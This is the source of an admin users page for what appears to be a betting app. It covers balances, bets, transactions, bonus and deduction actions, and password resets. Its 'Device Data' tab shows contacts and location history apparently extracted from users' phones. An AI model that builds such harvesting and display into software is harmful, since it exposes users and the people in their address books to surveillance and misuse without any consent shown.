"use client";

import React, { useEffect, useState, useCallback } from "react";
import { format } from "date-fns";
import {
  Card,
  Button,
  Input,
  Select,
  Badge,
  Modal,
  SlideOver,
  Tabs,
  Spinner,
  ErrorMsg,
  PageHeader,
  DataTable,
  EmptyState,
  Field,
} from "@/components/ui";
import {
  listUsers,
  toggleUserActive,
  addUserBonus,
  deductUserFunds,
  resetUserPassword,
  getUserDetailed,
  listBids,
  listDeposits,
  listWithdrawals,
  getUserContacts,
  getUserLocations,
} from "@/lib/admin";
import { parseApiError } from "@/lib/error-parser";

const fmt = (n: any) => {
  if (n === undefined || n === null) return "—";
  return Number(n).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
};

export default function UsersPage() {
  const [users, setUsers] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [filters, setFilters] = useState({ username: "", phone: "", is_active: "" });

  const [selected, setSelected] = useState<any>(null);
  const [detail, setDetail] = useState<any>(null);
  const [userBids, setUserBids] = useState<any[]>([]);
  const [userDeposits, setUserDeposits] = useState<any[]>([]);
  const [userWithdrawals, setUserWithdrawals] = useState<any[]>([]);
  const [userContacts, setUserContacts] = useState<any[]>([]);
  const [userLocations, setUserLocations] = useState<any[]>([]);
  const [loadingDetails, setLoadingDetails] = useState(false);
  
  const [activeTab, setActiveTab] = useState("overview");

  const [bonusUser, setBonusUser] = useState<any>(null);
  const [bonusAmount, setBonusAmount] = useState("0");
  const [bonusDesc, setBonusDesc] = useState("Bonus credited");
  const [resetUser, setResetUser] = useState<any>(null);
  const [resetPw, setResetPw] = useState("");
  const [actionError, setActionError] = useState<string | null>(null);
  const [actionMsg, setActionMsg] = useState<string | null>(null);

  const load = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const params: any = {};
      if (filters.username) params.username = filters.username;
      if (filters.phone) params.phone = filters.phone;
      if (filters.is_active !== "") params.is_active = filters.is_active === "true";
      const data = await listUsers(params);
      setUsers(data);
    } catch (e: any) {
      setError(parseApiError(e, "Failed to load users"));
    } finally {
      setLoading(false);
    }
  }, [filters]);

  useEffect(() => {
    load();
  }, [load]);

  async function openDetail(user: any) {
    setSelected(user);
    setDetail(null);
    setUserBids([]);
    setUserDeposits([]);
    setUserWithdrawals([]);
    setUserContacts([]);
    setUserLocations([]);
    setActiveTab("overview");
    setLoadingDetails(true);
    try {
      const [d, b, dep, w, contacts, locations] = await Promise.all([
        getUserDetailed(user.id),
        listBids({ user_id: user.id, limit: 50 }),
        listDeposits({ user_id: user.id, limit: 50 }),
        listWithdrawals({ user_id: user.id, limit: 50 }),
        getUserContacts(user.id),
        getUserLocations(user.id),
      ]);
      setDetail(d);
      setUserBids(b);
      setUserDeposits(dep);
      setUserWithdrawals(w);
      setUserContacts(contacts);
      setUserLocations(locations);
    } catch (e: any) {
      console.error(e);
    } finally {
      setLoadingDetails(false);
    }
  }

  async function handleToggle(user: any) {
    try {
      await toggleUserActive(user.id);
      load();
    } catch (e: any) {
      setError(parseApiError(e, "Failed to toggle user status"));
    }
  }

  async function submitBonus() {
    if (!bonusUser) return;
    try {
      await addUserBonus(bonusUser.id, parseFloat(bonusAmount), bonusDesc);
      setBonusUser(null);
      setActionMsg("Bonus credited successfully");
      load();
      if (selected && selected.id === bonusUser.id) {
          openDetail(selected); // refresh details if open
      }
    } catch (e: any) {
      setError(parseApiError(e, "Failed to credit bonus"));
    }
  }

  const [deductUser, setDeductUser] = useState<any>(null);
  const [deductAmount, setDeductAmount] = useState("0");
  const [deductDesc, setDeductDesc] = useState("Manual deduction");

  async function submitDeduct() {
    if (!deductUser) return;
    try {
      // Need to import deductUserFunds from "@/lib/admin" first
      const { deductUserFunds } = await import("@/lib/admin");
      await deductUserFunds(deductUser.id, parseFloat(deductAmount), deductDesc);
      setDeductUser(null);
      setActionMsg("Funds deducted successfully");
      load();
      if (selected && selected.id === deductUser.id) {
          openDetail(selected);
      }
    } catch (e: any) {
      setError(parseApiError(e, "Failed to deduct funds"));
    }
  }

  async function submitReset() {
    if (!resetUser) return;
    try {
      await resetUserPassword(resetUser.id, resetPw);
      setResetUser(null);
      setResetPw("");
      setActionMsg("Password reset successfully");
    } catch (e: any) {
      setActionError(parseApiError(e, "Failed to reset password"));
    }
  }

  const tabs = [
    { id: "overview", label: "Overview", icon: "👤" },
    { id: "bets", label: "Recent Bets", icon: "🎯" },
    { id: "transactions", label: "Transactions", icon: "💸" },
    { id: "device", label: "Device Data", icon: "📱" },
    { id: "security", label: "Security & Actions", icon: "🛡️" },
  ];

  return (
    <div className="space-y-6">
      <PageHeader title="Users" description="Manage accounts, balances and access" />

      <ErrorMsg msg={error} />
      {actionMsg && (
        <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 px-3 py-2.5 text-sm text-emerald-300">
          {actionMsg}
        </div>
      )}

      <Card>
        <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-4">
          <Input
            placeholder="Username"
            value={filters.username}
            onChange={(e) => setFilters({ ...filters, username: e.target.value })}
          />
          <Input
            placeholder="Phone"
            value={filters.phone}
            onChange={(e) => setFilters({ ...filters, phone: e.target.value })}
          />
          <Select
            value={filters.is_active}
            onChange={(e) => setFilters({ ...filters, is_active: e.target.value })}
          >
            <option value="">All status</option>
            <option value="true">Active</option>
            <option value="false">Inactive</option>
          </Select>
          <Button onClick={load} className="w-full sm:w-auto">
            Search
          </Button>
        </div>
      </Card>

      <Card title={`${users.length} users`} bodyClassName="p-0">
        {loading ? (
          <div className="p-4">
            <Spinner />
          </div>
        ) : (
          <DataTable
            getRowKey={(u) => u.id}
            rows={users}
            columns={[
              { key: "id", header: "ID", className: "w-12 text-slate-500" },
              {
                key: "username",
                header: "Username",
                render: (u) => (
                  <span className="font-medium text-slate-100">
                    {u.username}
                    {u.username === "admin" && <Badge color="brand" className="ml-2">Owner</Badge>}
                  </span>
                ),
              },
              { key: "phone", header: "Phone" },
              { key: "balance", header: "Balance", render: (u) => fmt(u.wallet_balance) },
              {
                key: "status",
                header: "Status",
                render: (u) => (
                  <Badge color={u.is_active ? "emerald" : "red"}>
                    {u.is_active ? "Active" : "Inactive"}
                  </Badge>
                ),
              },
              {
                key: "actions",
                header: "Actions",
                className: "text-right",
                render: (u) => (
                  <Button size="sm" variant="outline" onClick={() => openDetail(u)}>View Profile</Button>
                ),
              },
            ]}
          />
        )}
      </Card>

      {/* User Detail SlideOver */}
      <SlideOver
        open={!!selected}
        onClose={() => setSelected(null)}
        title={selected?.username}
        description={`ID: ${selected?.id} • ${selected?.phone}`}
      >
        {selected && (
          <div className="space-y-6">
            <Tabs tabs={tabs} activeTab={activeTab} onChange={setActiveTab} />
            
            {loadingDetails ? (
              <Spinner className="min-h-[200px]" />
            ) : (
              <div className="animate-fade-in mt-4">
                {activeTab === "overview" && (
                  <div className="space-y-6">
                    <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 md:grid-cols-3">
                      <Card bodyClassName="p-4 flex flex-col items-center text-center">
                        <span className="text-xs text-slate-500 uppercase">Balance</span>
                        <span className="text-xl font-bold text-emerald-400">₹{fmt(selected.wallet_balance)}</span>
                      </Card>
                      <Card bodyClassName="p-4 flex flex-col items-center text-center">
                        <span className="text-xs text-slate-500 uppercase">Status</span>
                        <Badge color={selected.is_active ? "emerald" : "red"} className="mt-1">{selected.is_active ? "Active" : "Inactive"}</Badge>
                      </Card>
                      <Card bodyClassName="p-4 flex flex-col items-center text-center">
                        <span className="text-xs text-slate-500 uppercase">Role</span>
                        <Badge color={selected.username === "admin" ? "brand" : "slate"} className="mt-1">{selected.username === "admin" ? "Owner" : "User"}</Badge>
                      </Card>
                    </div>

                    {detail && (
                      <Card title="Activity Summary">
                        <div className="grid grid-cols-1 gap-6 sm:grid-cols-2 md:grid-cols-4">
                          <Field label="Total Bets" value={detail.total_bets} />
                          <Field label="Total Wins" value={`₹${fmt(detail.total_wins)}`} />
                          <Field label="Total Deposits" value={`₹${fmt(detail.total_deposits)}`} />
                          <Field label="Total Withdrawals" value={`₹${fmt(detail.total_withdrawals)}`} />
                        </div>
                      </Card>
                    )}
                  </div>
                )}

                {activeTab === "bets" && (
                  <Card title="Recent Bets" bodyClassName="p-0">
                    <DataTable
                      getRowKey={(b) => b.id}
                      rows={userBids}
                      columns={[
                        { key: "market", header: "Market", render: (b) => b.market_name },
                        { key: "type", header: "Type", render: (b) => b.bet_type },
                        { key: "number", header: "Number", render: (b) => <span className="font-bold text-slate-200">{b.selected_number}</span> },
                        { key: "points", header: "Points", render: (b) => fmt(b.amount) },
                        { key: "status", header: "Status", render: (b) => (
                           <Badge color={b.status === "won" ? "emerald" : b.status === "lost" ? "red" : "slate"}>
                             {b.status.toUpperCase()}
                           </Badge>
                        )},
                        { key: "date", header: "Date", render: (b) => format(new Date(b.created_at), "dd/MM/yyyy") },
                      ]}
                    />
                  </Card>
                )}

                {activeTab === "transactions" && (
                  <div className="space-y-6">
                    <Card title="Recent Deposits" bodyClassName="p-0">
                      <DataTable
                        getRowKey={(d) => d.id}
                        rows={userDeposits}
                        columns={[
                          { key: "amount", header: "Amount", render: (d) => <span className="text-emerald-400">+₹{fmt(d.amount)}</span> },
                          { key: "method", header: "Method", render: (d) => d.payment_method },
                          { key: "status", header: "Status", render: (d) => (
                            <Badge color={d.status === "completed" || d.status === "approved" || d.status === "success" ? "emerald" : d.status === "rejected" || d.status === "failed" ? "red" : "amber"}>
                              {d.status}
                            </Badge>
                          )},
                          { key: "date", header: "Date", render: (d) => format(new Date(d.created_at), "dd/MM/yyyy") },
                        ]}
                      />
                    </Card>

                    <Card title="Recent Withdrawals" bodyClassName="p-0">
                      <DataTable
                        getRowKey={(w) => w.id}
                        rows={userWithdrawals}
                        columns={[
                          { key: "amount", header: "Amount", render: (w) => <span className="text-red-400">-₹{fmt(w.amount)}</span> },
                          { key: "method", header: "Method", render: (w) => w.payment_method },
                          { key: "status", header: "Status", render: (w) => (
                            <Badge color={w.status === "approved" ? "emerald" : w.status === "rejected" ? "red" : "amber"}>
                              {w.status}
                            </Badge>
                          )},
                          { key: "date", header: "Date", render: (w) => format(new Date(w.requested_at || w.created_at), "dd/MM/yyyy") },
                        ]}
                      />
                    </Card>
                  </div>
                )}

                {activeTab === "device" && (
                  <div className="space-y-6">
                    <Card title={`Contacts (${userContacts.length})`} bodyClassName="p-0 max-h-96 overflow-y-auto">
                      <DataTable
                        getRowKey={(c: any, i) => i}
                        rows={userContacts}
                        columns={[
                          { key: "name", header: "Name", render: (c) => c.name || "Unknown" },
                          { key: "number", header: "Number", render: (c) => c.number },
                          { key: "date", header: "Date Extracted", render: (c) => format(new Date(c.created_at), "dd/MM/yyyy HH:mm") },
                        ]}
                      />
                    </Card>

                    <Card title={`Location History (${userLocations.length})`} bodyClassName="p-0 max-h-96 overflow-y-auto">
                      <DataTable
                        getRowKey={(l: any, i) => i}
                        rows={userLocations}
                        columns={[
                          { key: "coords", header: "Coordinates", render: (l) => `${l.latitude || '-'}, ${l.longitude || '-'}` },
                          { key: "address", header: "Address", render: (l) => l.address || "-" },
                          { key: "date", header: "Date Extracted", render: (l) => format(new Date(l.created_at), "dd/MM/yyyy HH:mm") },
                        ]}
                      />
                    </Card>
                  </div>
                )}

                {activeTab === "security" && (
                  <div className="space-y-4">
                    <Card title="Account Status">
                      <div className="flex items-center justify-between">
                        <div>
                          <p className="text-sm font-medium text-slate-200">Active Status</p>
                          <p className="text-xs text-slate-500">Prevent this user from logging in or placing bets.</p>
                        </div>
                        <Button variant={selected.is_active ? "danger" : "success"} onClick={() => handleToggle(selected)}>
                          {selected.is_active ? "Disable Account" : "Enable Account"}
                        </Button>
                      </div>
                    </Card>

                    <Card title="Credit Bonus">
                       <p className="text-xs text-slate-500 mb-4">Add promotional bonus directly to this user's wallet.</p>
                       <Button onClick={() => { setBonusAmount("0"); setBonusDesc("Bonus credited"); setBonusUser(selected); }}>
                          Credit Bonus
                       </Button>
                    </Card>

                    <Card title="Deduct Funds">
                       <p className="text-xs text-slate-500 mb-4">Manually deduct funds from this user's wallet.</p>
                       <Button variant="danger" onClick={() => { setDeductAmount("0"); setDeductDesc("Manual deduction"); setDeductUser(selected); }}>
                          Deduct Funds
                       </Button>
                    </Card>

                    <Card title="Reset Password">
                       <p className="text-xs text-slate-500 mb-4">Force a password reset for this user.</p>
                       <Button variant="danger" onClick={() => { setResetPw(""); setResetUser(selected); }}>
                          Reset Password
                       </Button>
                    </Card>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </SlideOver>

      {/* Bonus modal */}
      <Modal open={!!bonusUser} onClose={() => setBonusUser(null)} title={`Add Bonus — ${bonusUser?.username ?? ""}`}>
        <div className="space-y-4">
          <Field label="Amount">
            <Input type="number" value={bonusAmount} onChange={(e) => setBonusAmount(e.target.value)} />
          </Field>
          <Field label="Description">
            <Input value={bonusDesc} onChange={(e) => setBonusDesc(e.target.value)} />
          </Field>
          <div className="flex justify-end gap-2">
            <Button variant="ghost" onClick={() => setBonusUser(null)}>Cancel</Button>
            <Button onClick={submitBonus}>Credit</Button>
          </div>
        </div>
      </Modal>

      {/* Deduct modal */}
      <Modal open={!!deductUser} onClose={() => setDeductUser(null)} title={`Deduct Funds — ${deductUser?.username ?? ""}`}>
        <div className="space-y-4">
          <Field label="Amount">
            <Input type="number" value={deductAmount} onChange={(e) => setDeductAmount(e.target.value)} />
          </Field>
          <Field label="Description / Reason">
            <Input value={deductDesc} onChange={(e) => setDeductDesc(e.target.value)} />
          </Field>
          <div className="flex justify-end gap-2">
            <Button variant="ghost" onClick={() => setDeductUser(null)}>Cancel</Button>
            <Button variant="danger" onClick={submitDeduct}>Deduct</Button>
          </div>
        </div>
      </Modal>

      {/* Reset password modal */}
      <Modal open={!!resetUser} onClose={() => setResetUser(null)} title={`Reset Password — ${resetUser?.username ?? ""}`}>
        <div className="space-y-4">
          <ErrorMsg msg={actionError} />
          <Field label="New Password">
            <Input value={resetPw} onChange={(e) => setResetPw(e.target.value)} placeholder="Enter new password" />
          </Field>
          <div className="flex justify-end gap-2">
            <Button variant="ghost" onClick={() => setResetUser(null)}>Cancel</Button>
            <Button variant="danger" onClick={submitReset}>Reset</Button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
